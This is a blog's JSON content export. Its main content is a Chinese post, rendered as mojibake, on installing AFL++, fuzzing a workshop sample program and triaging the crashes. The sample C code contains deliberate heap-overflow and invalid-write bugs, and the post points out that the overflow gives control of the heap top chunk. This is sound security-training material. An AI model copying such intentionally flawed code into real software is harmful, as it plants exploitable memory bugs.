{"meta":{"title":"Mundi's Space","subtitle":"Be wise and fool.","description":null,"author":"å¯’é›¨","url":"https://mundi-xu.github.io"},"pages":[{"title":"about","date":"2020-12-22T15:38:55.000Z","updated":"2020-12-24T14:02:06.726Z","comments":false,"path":"about/index.html","permalink":"https://mundi-xu.github.io/about/index.html","excerpt":"","text":"My name is Mundi, and this is my Blog!!!Hope you have fun here~Then just enjoy the music of my beloved one."}],"posts":[{"title":"AFL++å­¦ä¹ æ—¥å¿—ï¼ˆä¸€ï¼‰å¼€å§‹Fuzzä¸crashesåˆ†æ","slug":"AFL++å­¦ä¹ æ—¥å¿—ï¼ˆä¸€ï¼‰å¼€å§‹Fuzzä¸crashesåˆ†æ","date":"2021-03-12T08:53:57.000Z","updated":"2021-03-18T10:42:16.849Z","comments":true,"path":"2021/03/12/AFL++å­¦ä¹ æ—¥å¿—ï¼ˆä¸€ï¼‰å¼€å§‹Fuzzä¸crashesåˆ†æ/","link":"","permalink":"https://mundi-xu.github.io/2021/03/12/AFL++%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97%EF%BC%88%E4%B8%80%EF%BC%89%E5%BC%80%E5%A7%8BFuzz%E4%B8%8Ecrashes%E5%88%86%E6%9E%90/","excerpt":"æœ¬æ–‡ä¸»è¦ä»‹ç»å¦‚ä½•ä½¿ç”¨AFL++å¿«é€Ÿå¼€å§‹Fuzzä¸€ä¸ªæ ·ä¾‹ç¨‹åºå’Œå¯¹å¤§é‡çš„Fuzzer-Generated Crashesè¿›è¡Œåˆ†ç±»ä»¥åŠéƒ¨åˆ†å·¥å…·çš„å®‰è£…ä¸ä½¿ç”¨","text":"å‰è¨€American Fuzzy Lop plus plus (afl++)æ˜¯ä¸€ä¸ªç”±ç¤¾åŒºé©±åŠ¨çš„å¼€æºå·¥å…·ï¼Œå®ƒç»“åˆäº†æœ€æ–°çš„æ¨¡ç³Šç ”ç©¶ï¼Œä½¿ç ”ç©¶å…·æœ‰å¯æ¯”æ€§ï¼Œå¯é‡å¤æ€§ï¼Œå¯ç»„åˆæ€§ï¼Œå¹¶ä¸”-æœ€é‡è¦çš„æ˜¯-å¯ç”¨çš„ ã€‚å®ƒæä¾›äº†å¤šç§æ–°åŠŸèƒ½ï¼Œä¾‹å¦‚ï¼ŒCustom Mutator API ï¼ˆä¼ ç»Ÿçš„çªå˜APIï¼‰èƒ½å¤Ÿå¢åŠ æ¨¡ç³Šæµ‹è¯•å¤„ç†ç­–ç•¥ï¼Œç‰¹å®šç›®æ ‡çš„å˜å¼‚ä¹Ÿå¯ä»¥ç”±ç»éªŒä¸°å¯Œçš„å®‰å…¨æµ‹è¯•äººå‘˜ç¼–å†™ã€‚å…·ä½“ç»†èŠ‚å¯ä»¥å‚é˜…AFL++ : Combining Incremental Steps of Fuzzing Researchã€‚ æœ¬æ–‡ä¸»è¦ä»‹ç»å¦‚ä½•ä½¿ç”¨AFL++å¿«é€Ÿå¼€å§‹Fuzzä¸€ä¸ªæ ·ä¾‹ç¨‹åºå’Œå¯¹å¤§é‡çš„Fuzzer-Generated Crashesè¿›è¡Œåˆ†ç±»ä»¥åŠéƒ¨åˆ†å·¥å…·çš„å®‰è£…ä¸ä½¿ç”¨ï¼Œå¦‚æœ‰é”™æ¼ï¼Œä¹Ÿè¯·å¸ˆå‚…ä»¬ä¸åèµæ•™ã€‚ AFL++çš„å®‰è£… American Fuzzy Lop plus plus (afl++)Release Version: 3.10cGithub Version: 3.11aRepository: https://github.com/AFLplusplus/AFLplusplusDoc: https://aflplus.plus/ æœ€ç®€å•çš„å½“ç„¶å°±æ˜¯ä½¿ç”¨Dockerå•¦ï¼Œç›´æ¥ä¸€é”®pullå°±å¯ä»¥ä½¿ç”¨äº†ï¼Œå…·ä½“è¯·å‚è§Dockerfile(ä¸€èˆ¬æƒ…å†µä¸‹éƒ½å¤Ÿç”¨äº†) 12docker pull aflplusplus/aflplusplusdocker run -ti -v /location/of/your/target:/src aflplusplus/aflplusplus æˆ–è€…æ‰‹åŠ¨å®‰è£…ä¾èµ–åä¸‹è½½æºç ç¼–è¯‘æ„å»ºã€‚ 12sudo apt-get install git build-essential curl libssl-dev sudo libtool libtool-bin libglib2.0-dev bison flex automake python3 python3-dev python3-setuptools libpixman-1-dev gcc-9-plugin-dev cgroup-tools \\clang-11 clang-tools-11 libc++1-11 libc++-11-dev libc++abi1-11 libc++abi-11-dev libclang1-11 libclang-11-dev libclang-common-11-dev libclang-cpp11 libclang-cpp11-dev liblld-11 liblld-11-dev liblldb-11 liblldb-11-dev libllvm11 libomp-11-dev libomp5-11 lld-11 lldb-11 python3-lldb-11 llvm-11 llvm-11-dev llvm-11-runtime llvm-11-tools æœ‰æ—¶ä½ å¯èƒ½éœ€è¦åˆ‡æ¢ä¸‹è½¯ä»¶çš„é»˜è®¤ç‰ˆæœ¬ã€‚ 1234sudo update-alternatives --install /usr/bin/clang clang `which clang-11.0` 1sudo update-alternatives --install /usr/bin/clang++ clang++ `which clang++-11.0` 1sudo update-alternatives --install /usr/bin/llvm-config llvm-config `which llvm-config-11.0` 1sudo update-alternatives --install /usr/bin/llvm-symbolizer llvm-symbolizer `which llvm-symbolizer-11.0` 1 è·å–æºç å¹¶ç¼–è¯‘å®‰è£…ã€‚ 12345git clone https://github.com/AFLplusplus/AFLpluspluscd AFLplusplusgit checkout stable # é€‰æ‹©å®‰è£…ç‰ˆæœ¬ï¼Œé»˜è®¤ä¸ºstablemake distrib # å®‰è£…åŒ…æ‹¬qemu_mode, unicorn_modeç­‰åœ¨å†…çš„æ‰€æœ‰æ¨¡å¼sudo make install makeæ„å»ºç›®æ ‡é€‰æ‹©ï¼š all: just the main afl++ binaries binary-only: everything for binary-only fuzzing: qemu_mode, unicorn_mode, libdislocator, libtokencap source-only: everything for source code fuzzing: instrumentation, libdislocator, libtokencap distrib: everything (for both binary-only and source code fuzzing) man: creates simple man pages from the help option of the programs install: installs everything you have compiled with the build options above clean: cleans everything compiled, not downloads (unless not on a checkout) deepclean: cleans everything including downloads code-format: format the code, do this before you commit and send a PR please! tests: runs test cases to ensure that all features are still working as they should unit: perform unit tests (based on cmocka) help: shows these build options æ„å»ºé€‰é¡¹ï¼š STATIC - compile AFL++ static ASAN_BUILD - compiles with memory sanitizer for debug purposes DEBUG - no optimization, -ggdb3, all warnings and -Werror PROFILING - compile with profiling information (gprof) INTROSPECTION - compile afl-fuzz with mutation introspection NO_PYTHON - disable python support NO_SPLICING - disables splicing mutation in afl-fuzz, not recommended for normal fuzzing AFL_NO_X86 - if compiling on non-intel/amd platforms LLVM_CONFIG - if your distro doesnâ€™t use the standard name for llvm-config (e.g. Debian) å®‰è£…å®Œæˆåçš„ç³»ç»Ÿé…ç½®ï¼š 12sudo ~/AFLplusplus/afl-system-config #å°†é™ä½ç³»ç»Ÿçš„å®‰å…¨æ€§ï¼Œå»ºè®®ä»…åœ¨dockerä¸­ä½¿ç”¨ulimit -c 0 # å½“ç¨‹åºcrashæ—¶ä¸äº§ç”Ÿcoreæ–‡ä»¶ï¼Œåœ¨å­˜åœ¨å¤§é‡crashesçš„æ—¶å€™ç‰¹åˆ«æœ‰ç”¨ å¼€å§‹Fuzzingç›¸ä¿¡å¾ˆå¤šäººåœ¨åˆšå¼€å§‹çš„æ—¶å€™éƒ½ä¼šæœ‰ä¸‹é¢ä¸¤ä¸ªé—®é¢˜ï¼ˆåŒ…æ‹¬æˆ‘ï¼‰ ä¸ç†Ÿæ‚‰æ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼› ç”¨æ¨¡ç³Šæµ‹è¯•æµ‹è¯•ä»€ä¹ˆå†…å®¹ å¯¹äºç¬¬ä¸€ç‚¹ï¼Œå»ºè®®å‚é˜…FuzzingBookå’ŒSakuraå¸ˆå‚…çš„AFLæºç æ³¨é‡Šï¼ŒåŒ…æ‹¬æˆ‘åç»­å¤§æ¦‚ç‡ä¹Ÿä¼šå†™ä¸€ä¸ªè‡ªå·±çš„Fuzzerï¼ˆä¸ä¼šå’•çš„ã€‚ã€‚ã€‚å§ã€‚ã€‚å¤§æ¦‚ã€‚ã€‚ï¼‰ä½œä¸ºå­¦ä¹ æ€»ç»“ï¼Œæ¬¢è¿å¸ˆå‚…ä»¬åœ¨è¯„è®ºåŒºå‚¬æ›´ï¼ˆé€ƒï¼‰ã€‚è‡³äºç¬¬äºŒä¸ªï¼Œæˆ‘ç›®å‰çš„é€‰æ‹©æ˜¯ç±»ä¼¼äºafl-trainingæˆ–è€…EkoParty_Advanced_Fuzzing_Workshopç­‰å­¦ä¹ ç±»å‹çš„targetï¼Œä¹Ÿæ˜¯æœ¬ç³»åˆ—æ–‡ç« çš„ä¸»è¦å†…å®¹éƒ¨åˆ†ï¼ˆå¯å‚è§æˆ‘çš„ä¸Šä¸€ç¯‡æ–‡ç« ï¼‰ã€‚ Fuzzing with AFL workshopRepository: https://github.com/mykter/afl-trainingDoc: https://github.com/mykter/afl-training/files/5454345/Fuzzing.with.AFL.-.GrayHat.2020.pdfDocker: https://ghcr.io/mykter/fuzz-training æµ‹è¯•ä»£ç å¯ä»¥åœ¨æ­¤ä¸‹è½½ï¼Œæ ¸å¿ƒå‡½æ•°ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445int process(char *input)&#123; char *out; char *rest; int len; if (strncmp(input, &quot;u &quot;, 2) == 0) &#123; // upper case command char *rest; len = strtol(input + 2, &amp;rest, 10); // how many characters of the string to upper-case rest += 1; // skip the first char (should be a space) out = malloc(len + strlen(input)); // could be shorter, but play it safe if (len &gt; (int)strlen(input)) /* skip */ for (int i = 0; i != len; i++) &#123; char c = rest[i]; if (c &gt; 96 &amp;&amp; c &lt; 123) // ascii a-z &#123; c -= 32; &#125; out[i] = c; &#125; out[len] = 0; strcat(out, rest + len); // append the remaining text printf(&quot;%s&quot;, out); free(out); &#125; else if (strncmp(input, &quot;head &quot;, 5) == 0) &#123; // head command if (strlen(input) &gt; 6) &#123; len = strtol(input + 4, &amp;rest, 10); rest += 1; // skip the first char (should be a space) rest[len] = &#x27;\\0&#x27;; // truncate string at specified offset printf(&quot;%s\\n&quot;, rest); &#125; /* skip */ &#125; else if (strcmp(input, &quot;surprise!\\n&quot;) == 0) &#123; // easter egg! *(char *)1 = 2; &#125; /* skip */&#125; ä½¿ç”¨afl-clang-fastè¿›è¡Œç¼–è¯‘ï¼Œå¦‚æç¤ºå‘½ä»¤æœªæ‰¾åˆ°å°±å°†AFL++ç›®å½•æ·»åŠ è‡³PATHç¯å¢ƒå˜é‡ã€‚ 1afl-clang-fast -AFL_HARDEN=1 vulnerable.c -o vulnerable # è‹¥ä½¿ç”¨afl-ccä¼šè‡ªåŠ¨é€‰æ‹©æœ€åˆé€‚çš„ç¼–è¯‘å™¨ è®¾ç½®AFL_HARDENä¼šè®©è°ƒç”¨çš„ä¸‹æ¸¸ç¼–è¯‘å™¨è‡ªåŠ¨åŒ–ä»£ç åŠ å›ºï¼Œä½¿å¾—æ£€æµ‹ç®€å•çš„å†…å­˜bugå˜å¾—æ›´åŠ å®¹æ˜“ï¼Œä½†ä¼šå‡å°‘5%å·¦å³çš„æ€§èƒ½ï¼Œå…³äºAFL++çš„ç¯å¢ƒå˜é‡è®¾ç½®å¯ä»¥å‚é˜…https://aflplus.plus/docs/env_variables/ã€‚ ä½¿ç”¨afl-fuzzè¿›è¡ŒFuzzï¼Œè¾“å…¥å¯ä»¥éšæ„å†™ï¼Œå¦‚echo 1 &gt; inputs/1ï¼Œæˆ–å¸¦æœ‰æºç ä¸­å…³é”®å­—çš„è¾“å…¥ï¼ˆæ¨èï¼‰ï¼Œå¦‚echo &quot;u 4 capsme&quot; &gt; inputs/2ï¼Œä½†éœ€ä¿è¯è¾“å…¥å¿…é¡»èƒ½ä½¿ç¨‹åºæ­£å¸¸è¿è¡Œï¼ˆå³ä¸èƒ½ä¸€å¼€å§‹å°±æ•´ä¸ªcrashï¼‰ã€‚ 12345mkdir inputsmkdir outecho 1 &gt; inputs/1echo &quot;u 4 capsme&quot; &gt; inputs/2afl-fuzz -i inputs -o out ./vulnerable å¦‚æœä¸€åˆ‡æ­£å¸¸çš„è¯ï¼Œç¡ä¸ªåˆè§‰ä¹‹åä½ å°±èƒ½çœ‹è§ç±»ä¼¼äºå¦‚ä¸‹çš„å›¾ï¼š æ¯ä¸ªç‹¬ç‰¹çš„crashå’Œå‘½ä»¤å‚æ•°éƒ½å°†å­˜æ”¾åœ¨è¾“å‡ºæ–‡ä»¶å¤¹çš„crashesæ–‡ä»¶å¤¹ä¸‹ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¯¹è¿™äº›crashè¿›è¡Œè°ƒè¯•åˆ†æäº†ã€‚ crashesåˆ†ç±»ä¸è‡ªåŠ¨åŒ–åˆ†æåœ¨å¼€å§‹åˆ†æå‰è¯·ç¡®ä¿å·²å®‰è£…gdbç­‰å¸¸ç”¨äºŒè¿›åˆ¶è°ƒè¯•å·¥å…·ï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯GDBçš„gefæ’ä»¶ã€‚ å¯¹crashesçš„åˆ†ç±»åŒ…æ‹¬è°ƒè¯•åˆ†æFuzzç¨‹åºå‘ç°çš„æ¯ä¸ªcrashä»¥ç¡®å®šç¢°æ’æ˜¯å¦å€¼å¾—è¿›ä¸€æ­¥åˆ†æï¼ˆå¯¹å®‰å…¨ç ”ç©¶äººå‘˜è€Œè¨€ï¼Œè¿™é€šå¸¸æ„å‘³ç€ç¡®å®šcrashæ˜¯å¦å¯èƒ½æ˜¯ç”±æ¼æ´é€ æˆçš„ï¼‰ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™ç¡®å®šcrashçš„æ ¹æœ¬åŸå› ã€‚è¯¦ç»†åœ°äººå·¥åˆ†ææ¯ä¸€ä¸ªcrashéƒ½éå¸¸è€—æ—¶è€—åŠ›ï¼Œå°¤å…¶å½“Fuzzerå·²ç»è¯†åˆ«å‡ºå‡ åæ¬¡æˆ–ä¸Šç™¾æ¬¡crashæ—¶ã€‚ å¹¸è¿çš„æ˜¯ç°åœ¨å·²æœ‰è®¸å¤šå¯ç”¨äºå¸®åŠ©åˆ†ç±»æˆ–åˆ†æcrashçš„æŠ€æœ¯å’Œå·¥å…·ã€‚è™½ç„¶crashesçš„åˆ†ç±»ä»ç„¶å¯èƒ½æ˜¯ä¸€ä¸ªç—›è‹¦çš„è¿‡ç¨‹ï¼Œä½†ä¸‹è¿°çš„å·¥å…·å¯ä»¥å¸®åŠ©å‡è½»ä¸€äº›ä¹å‘³çš„å·¥ä½œï¼Œè‡³å°‘ä¹Ÿèƒ½å¤§æ¦‚ç¡®å®šæœ€æœ‰å¯èƒ½è§¦å‘å®‰å…¨ç›¸å…³é—®é¢˜çš„crashä¼˜å…ˆçº§ã€‚ crashå¤ç°ä¸åˆæ­¥åˆ†æé¦–å…ˆæˆ‘ä»¬æ¥çœ‹çœ‹åˆšæ‰å¾—åˆ°çš„ä¹ä¸ªcrashï¼ˆè¿™é‡Œåªæœ‰å…«ä¸ªçš„åŸå› æ˜¯æˆ‘æœåŠ¡å™¨å´©äº†å¯¼è‡´æˆ‘é‡è·‘äº†ä¸€éï¼Œä½†ç¬¬ä¹ä¸ªcrashæ€ä¹ˆä¹Ÿå‡ºä¸æ¥ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ï¼‰ æˆ‘ä»¬å…ˆç”¨gdbç®€å•è°ƒè¯•ä¸‹ï¼š æ˜¾ç„¶ï¼Œæˆ‘ä»¬èƒ½çŸ¥é“é”™è¯¯ç±»å‹ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ä¸ºSIGSEVï¼‰ï¼Œå‘ç”Ÿé”™è¯¯çš„ä»£ç è¡Œï¼ˆå› ä¸ºäºŒè¿›åˆ¶æ–‡ä»¶æ˜¯å¸¦è°ƒè¯•ä¿¡æ¯ç¼–è¯‘çš„ï¼‰ï¼Œé€ æˆå´©æºƒçš„æŒ‡ä»¤ï¼ˆmovdqu xmm2, XMMWORD PTR [r13+rdi*1+0x11]ï¼Œå¤§æ¦‚ç‡æ˜¯å› ä¸ºéæ³•è®¿é—®å†…å­˜ï¼‰ï¼Œbacktraceä»¥åŠå…¶ä»–è¯¸å¦‚stackå†…å®¹ç­‰ä¿¡æ¯ã€‚ä½†é€ä¸ªè¿™æ ·åˆ†æcrashæ˜¯ä¸€ä»¶å¾ˆè´¹æ—¶è´¹åŠ›çš„å·¥ä½œï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€äº›è‡ªåŠ¨åŒ–å·¥å…·æ¥å¸®åŠ©æˆ‘ä»¬è¿›è¡Œåˆ†æã€‚ è‡ªåŠ¨åŒ–å·¥å…·çš„ä»‹ç»å’Œä½¿ç”¨ GDB â€˜exploitableâ€™ pluginRepository: https://github.com/jfoote/exploitable exploitableæ˜¯ä¸€ä¸ªgdbæ’ä»¶ï¼Œå®‰è£…è¯·å‚è§å®‰è£…æ–‡æ¡£ï¼Œå®ƒè¯•å›¾ç¡®å®šæŸä¸ªç‰¹å®šçš„crashæ˜¯å¦å¯èƒ½å¯ä»¥è¢«åˆ©ç”¨ã€‚è¯¥æ’ä»¶ä¸ºå„ç±»ç¨‹åºçŠ¶æ€æä¾›äº†ä¸€ç³»åˆ—çš„åˆ†ç±»æ ‡å‡†ï¼Œå¦‚æœç¨‹åºå¤„äºå¯ä»¥è¢«æ’ä»¶è¯†åˆ«çš„çŠ¶æ€ï¼Œå®ƒå°†ä¸ºè¯¥çŠ¶æ€åˆ†é…å¯åˆ©ç”¨æ€§çš„åˆ†ç±»ã€‚ä½¿ç”¨å¦‚ä¸‹ï¼š æ­¤å·¥å…·å¯ä»¥å¸®åŠ©ç”¨æˆ·ä¼˜å…ˆåˆ†æé‚£äº›æœ€æœ‰å¯èƒ½è¢«åˆ©ç”¨çš„crashï¼Œä¸å¤ªå¯èƒ½è¢«åˆ©ç”¨çš„ï¼ˆæˆ–è€…æ’ä»¶æ— æ³•åˆ†æçš„ï¼‰å¯èƒ½ä»ç„¶å€¼å¾—åˆ†æï¼Œä½†è¿™æ˜¯åœ¨è°ƒè¯•äº†é‚£äº›æ›´æœ‰å¸Œæœ›å‘ç°æ¼æ´çš„crashä¹‹åã€‚ crashwalkRepository: https://github.com/bnagy/crashwalkDoc: https://pkg.go.dev/github.com/bnagy/crashwalk Crashwalkæ˜¯åœ¨exploitableæ’ä»¶åŸºç¡€ä¸Šå¼€å‘çš„ä¸€æ¬¾å·¥å…·ã€‚Crashwalkå°†éå†AFLç”Ÿæˆçš„crasheså¹¶åœ¨crashçŠ¶æ€ä¸‹è¿è¡Œexploitableå¹¶ç”Ÿæˆä¸€ä¸ªcrashwalk.dbæ–‡ä»¶ã€‚ ä½¿ç”¨æ–¹æ³•ï¼š 12export CW_EXPLOITABLE=/path/to/exploitable.py./cwtriage -root ./out/default/crashes/ -match id -- ./vulnerable ä½¿ç”¨cwdumpè·å–æ‘˜è¦ï¼š 1./cwdump ./crashwalk.db afl-utilsRepository: https://gitlab.com/rc0r/afl-utilsDocs: https://gitlab.com/rc0r/afl-utils/-/tree/master/docs å«æœ‰ä¸€ç³»åˆ—ååŠ©Fuzzingçš„å·¥å…·é›†åˆï¼š è‡ªåŠ¨crashæ ·æœ¬æ”¶é›†ï¼ŒéªŒè¯ï¼Œè¿‡æ»¤å’Œåˆ†æï¼ˆafl-collectï¼Œafl-vcrashï¼‰ è½»æ¾ç®¡ç†å¹¶è¡Œï¼ˆå¤šæ ¸ï¼‰Fuzzæµ‹è¯•ä½œä¸šï¼ˆafl-multicoreï¼Œafl-multikillï¼‰ è¯­æ–™åº“ä¼˜åŒ–ï¼ˆafl-minimizeï¼‰ FuzzçŠ¶æ€ç»Ÿè®¡ç›‘ç£ï¼ˆafl-statsï¼‰ Fuzzeré˜Ÿåˆ—åŒæ­¥ï¼ˆafl-syncï¼‰ è‡ªä¸»å®ç”¨ç¨‹åºæ‰§è¡Œï¼ˆafl-cronï¼‰ å…¶ä¸­afl-collectä¸crashwalkç±»ä¼¼ï¼Œä¹Ÿå¯è°ƒç”¨exploitableè¿›è¡Œç®€å•åˆ†æå¹¶ç”Ÿæˆåº“ï¼Œå…·ä½“ä¸Šç¯‡æ–‡ç« å·²ç»ä»‹ç»è¿‡äº†ï¼Œä¸å†èµ˜è¿°ï¼Œç›´æ¥ä¸Šå›¾ï¼š å¯ä»¥çœ‹å‡ºafl-collectå¾ˆå¿«å°±ç»Ÿè®¡äº†è„šæœ¬æ•°æ®å¹¶å°†crashesæ•´åˆåå¤åˆ¶åˆ°äº†è¾“å‡ºæ–‡ä»¶å¤¹ï¼Œå¯¹æ¯”crashwalkçš„ç»“æœè€Œè¨€ç®€æ˜äº†å¾ˆå¤šã€‚ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œexploitableå¹¶æ²¡æœ‰è€ƒè™‘åœ¨ç°æœ‰é˜²å¾¡æœºåˆ¶ä¸‹æ¼æ´çš„åˆ©ç”¨éš¾åº¦ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦ä½¿ç”¨ä¸‹è¿°å·¥å…·æ¥è¾…åŠ©æˆ‘ä»¬è¿›è¡Œåˆ†æã€‚ AFL crash exploration modeRepository: https://github.com/AFLplusplus/AFLplusplus#help-crash-triageReference: https://lcamtuf.blogspot.com/2014/11/afl-fuzz-crash-exploration-mode.html è¿™æ˜¯ä¸€ç§å†…ç½®äºAFLä¸­çš„æ¨¡å¼ï¼ŒFuzzerå°†ä¸€ä¸ªæˆ–å¤šä¸ªå¯¼è‡´crashçš„æµ‹è¯•ç”¨ä¾‹ä½œä¸ºè¾“å…¥ï¼Œå¹¶ä½¿ç”¨å…¶feedback-driven fuzzingç­–ç•¥åœ¨ä¿æŒcrashçš„æƒ…å†µä¸‹å¿«é€Ÿæšä¸¾ç¨‹åºä¸­å¯ä»¥åˆ°è¾¾çš„æ‰€æœ‰ä»£ç è·¯å¾„ã€‚ ä¸€èˆ¬è€Œè¨€ï¼Œæˆ‘ä»¬å¸Œæœ›Fuzzeræ‰¾åˆ°æ›´å¤šç‹¬ç‰¹çš„crashè€Œä¸æ˜¯ä¸€æ¬¡åˆä¸€æ¬¡çš„åŒç±»crashesã€‚ç„¶è€Œï¼Œæ­£å¦‚æ–‡æ¡£ä¸­æ‰€æŒ‡å‡ºçš„ï¼Œè¿™ç§æ¨¡å¼çš„ç›®çš„æ˜¯åˆ›å»ºä¸€ä¸ªå°çš„crashesåº“ä»è€Œå¯ä»¥å¿«é€Ÿåœ°æ£€æŸ¥å®ƒæ¥åˆ†ææˆ‘ä»¬å¯¹æ¼æ´çš„æ§åˆ¶ç¨‹åº¦ã€‚ä¾‹å¦‚ï¼Œå¦‚æœcrashä¸å†™å…¥åœ°å€æœ‰å…³ï¼Œä½†æˆ‘ä»¬æ— æ³•æ§åˆ¶è¯¥åœ°å€ï¼Œé‚£ä¹ˆè¿™ä¸ªå°±å¯èƒ½ä¸æ˜¯é‚£ä¹ˆæœ‰ç”¨ã€‚å¦ä¸€æ–¹é¢ï¼Œå¦‚æœAFLçš„crash explorationæ¨¡å¼ç¡®å®šæˆ‘ä»¬å¯ä»¥é€šè¿‡æ›´æ”¹è¾“å…¥æ¥å¯¹ä»»æ„åœ°å€æ‰§è¡Œå†™æ“ä½œï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ›´æœ‰å¯èƒ½åˆ©ç”¨è¿™ä¸ªæ¼æ´è¿›è¡Œæ”»å‡»ã€‚ æˆ‘ä»¬å°†ä½¿ç”¨afl-fuzzç”Ÿæˆçš„åˆå§‹å´©æºƒç”¨ä¾‹æ¥å¯ç”¨å´©æºƒæ¢ç´¢æ¨¡å¼ï¼Œå³å°†crashesç›®å½•ä½œä¸ºè¾“å…¥å¹¶ä½¿ç”¨-Cè¿è¡Œafl-fuzzï¼š 1afl-fuzz -C -i out/default/crashes/ -o crash_exploration/ ./vulnerable å½“AFLå¼€å§‹ä»¥è¿™ç§æ¨¡å¼è¿è¡Œæ—¶ï¼Œå®ƒå°†æ£€æŸ¥æµ‹è¯•ç”¨ä¾‹ä»¥ç¡®ä¿å®ƒä»¬å¯¼è‡´crashï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š åœ¨AFLçš„æ­£å¸¸æ¨¡å¼ä¸­ï¼Œæ­¤æ­¥éª¤çš„ç›®çš„æ˜¯å¯¹æµ‹è¯•ç”¨ä¾‹è¿›è¡Œæ£€æŸ¥ä»¥ç¡®ä¿å®ƒä»¬ä¸ä¼šå¯¼è‡´å´©æºƒã€‚AFLå¸Œæœ›ä½¿ç”¨æ­£å¸¸çš„æµ‹è¯•æ–‡ä»¶æ¥ä½¿ç¨‹åºæŒ‰é¢„æœŸæ–¹å¼è¿è¡Œï¼Œä»¥ä¾¿å¯ä»¥å¯¹å®ƒä»¬è¿›è¡Œè¿­ä»£ä»¥è§¦å‘å¼‚å¸¸è¡Œä¸ºã€‚ç›¸åï¼Œå´©æºƒæ¢ç´¢æ¨¡å¼ç¡®ä¿è¿™äº›æµ‹è¯•ç”¨ä¾‹å·²ç»å¯¼è‡´crashï¼Œå› ä¸ºå®ƒå°†å°è¯•è¯†åˆ«å°†å¯¼è‡´ç›¸åŒçŠ¶æ€çš„å…¶ä»–ä»£ç è·¯å¾„ã€‚ Record and Replay FrameworkRepository: https://github.com/rr-debugger/rrDoc: https://rr-project.org/Wiki: https://github.com/rr-debugger/rr/wikiReference: Engineering Record And Replay For Deployability Extended Technical Report éœ€è¦Linuxå†…æ ¸3.11æˆ–æ›´é«˜ç‰ˆæœ¬ä¸”/proc/sys/kernel/perf_event_paranoidå¿…é¡»å°äºç­‰äº1ï¼ˆå³èƒ½å¤Ÿä½¿ç”¨perfè®¡æ•°å™¨ï¼‰ã€‚è¯¦ç»†è¦æ±‚è¯·å‚é˜…https://github.com/rr-debugger/rr/wiki/Building-And-Installing#hardwaresoftware-configuration ã€‚æˆ‘çš„æœåŠ¡å™¨ä¸ç¬¦åˆè¦æ±‚ï¼Œå°±åœ¨è¿™é‡Œä»…åšä¸ªä»‹ç»æ¨èå§ï¼Œæœ‰ç©ºå†è¡¥ï¼ˆå’•äº† å¯¹crashçš„ç®€å•è°ƒè¯•è®©æˆ‘ä»¬ä»ä¸Šé¢åˆ†å®Œç±»çš„crashesä¸­éšæœºæŒ‘ä¸€ä¸ªä¸¢åˆ°gdbé‡Œå»ï¼Œåœ¨strcat(out, rest + len);å¤„ä¸‹ä¸ªæ–­ç‚¹ï¼ˆå½“ç„¶åœ¨å…¶ä»–åœ°æ–¹ä¹Ÿå¯ä»¥ï¼Œä¸»è¦æ˜¯è¿™é‡Œçš„æº¢å‡ºç‚¹å¤ªæ˜æ˜¾äº†ã€‚ã€‚ã€‚ã€‚ï¼‰ å¯ä»¥çœ‹å‡ºæ¥åœ¨æ‰§è¡Œstrcatå‡½æ•°ä¹‹å‰çš„å †è¿˜æ˜¯ååˆ†æ­£å¸¸çš„ oops,æº¢å‡ºå•¦ï¼Œè®©æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹è¾“å…¥æ–‡ä»¶çš„å†…å®¹ æ˜¾ç„¶æ˜¯å› ä¸ºstrcaté€ æˆæº¢å‡ºè¦†ç›–äº†top chunkï¼Œç„¶ååœ¨printfè°ƒç”¨mallocçš„æ—¶å€™è§¦å‘crashã€‚è€Œè¾“å…¥æˆ‘ä»¬æ˜¯å¯ä»¥è‡ªå®šä¹‰çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ç°åœ¨å¯ä»¥æ§åˆ¶top chunkçš„sizeäº†ï¼Œæ¥ä¸‹æ¥çš„åˆ©ç”¨è¿‡ç¨‹å°±äº¤ç»™å„ä½å¸ˆå‚…ä»¬äº†ã€‚ æ€»ç»“åœ¨æœ¬æ–‡ä¸­æˆ‘ä»¬ä»‹ç»äº†AFL++çš„å®‰è£…å’Œå„ç±»å·¥å…·çš„ä½¿ç”¨ä»¥å¸®åŠ©æˆ‘ä»¬å¯¹Fuzzerç”Ÿæˆçš„crashesè¿›è¡Œåˆ†ç±»ä¸åˆ†æã€‚å½“ç„¶ï¼Œè¿˜æœ‰å¾ˆå¤šè‡ªåŠ¨åŒ–åˆ†æå·¥å…·æ²¡æœ‰ä»‹ç»ï¼Œå…·ä½“å¯ä»¥å‚é˜…https://aflplus.plus/docs/sister_projects/#crash-triage-coverage-analysis-and-other-companion-toolsã€‚ åœ¨ä¸‹ç¯‡æ–‡ç« ä¸­æˆ‘ä¼šå­¦ç€å¦‚ä½•å¯¹ä¸€äº›ç®€å•çš„åº“ä»£ç å’ŒçœŸå®è½¯ä»¶ç¼–å†™è„šæœ¬æ¥å¸®åŠ©Fuzzeræ›´å¥½åœ°è¿›è¡ŒFuzzingã€‚","categories":[],"tags":[{"name":"Fuzzing","slug":"Fuzzing","permalink":"https://mundi-xu.github.io/tags/Fuzzing/"},{"name":"æ¨¡ç³Šæµ‹è¯•","slug":"æ¨¡ç³Šæµ‹è¯•","permalink":"https://mundi-xu.github.io/tags/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/"},{"name":"AFL++","slug":"AFL","permalink":"https://mundi-xu.github.io/tags/AFL/"}]},{"title":"åä¸ºé²²é¹æœåŠ¡å™¨ä¸‹MySQL8çš„å®‰è£…ä¸è¿œç¨‹è¿æ¥é…ç½®","slug":"åä¸ºé²²é¹æœåŠ¡å™¨ä¸‹MySQL8çš„å®‰è£…ä¸ä½¿ç”¨","date":"2021-03-10T15:05:21.000Z","updated":"2021-03-12T10:04:45.423Z","comments":true,"path":"2021/03/10/å